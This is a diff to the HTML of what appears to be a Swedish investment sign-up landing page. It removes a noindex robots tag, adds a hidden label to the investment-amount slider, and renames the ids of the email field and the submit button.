@@ -2,7 +2,6 @@
 <html lang="en">
  <head>
     <meta charset="utf-8">
-    <meta name="robots" content="noindex,nofollow">
     <meta name="viewport" content="width=device-width,initial-scale=1">
   <link href="css/intlphone.css" rel="stylesheet" type="text/css"/>
   <link href="css/inline.css" rel="stylesheet" type="text/css"/>
@@ -1140,7 +1139,8 @@
          <p style="text-align: center; margin-bottom: 10px; font-size: 25px;">
           Din investering
          </p>
-         <input class="js-range-slider" name="my_range" readonly="" tabindex="-1" type="text" value="150"/>
+         <label for="my_range" style="display:none">Виберіть діапазон:</label>
+<input class="js-range-slider irs-hidden-input" id="my_range" name="my_range" readonly="" tabindex="-1" type="text" value="150">
         </div>
         <div class="flex flex-col mb-5">
          <p style="text-align: center; margin-bottom: 10px; margin-top: 50px; font-size: 25px;">
@@ -1838,7 +1838,7 @@
          </div>
         </div>
         <div class="form_group--email">
-         <input autocomplete="on" class="input-form-reg-up" id="email" name="email" placeholder="E-post:" required="" type="email"/>
+         <input autocomplete="on" class="input-form-reg-up" id="email1" name="email" placeholder="E-post:" required="" type="email"/>
          <center>
           <span class="error" id="email_result">
           </span>
@@ -1850,7 +1850,7 @@
          <input class="phone input-form-reg-num-up" name="phone" placeholder=" 406 12 345" required="" style="padding-left: 85px" type="tel"/>
         </div>
         <div class="form_group--button">
-         <button class="send-form btn btn-primary" id="buttonSend" type="submit">
+         <button class="send-form btn btn-primary" id="buttonSend1" type="submit">
           <span class="button--inner" style="text-transform: uppercase;">
            REGISTRERA
           </span>
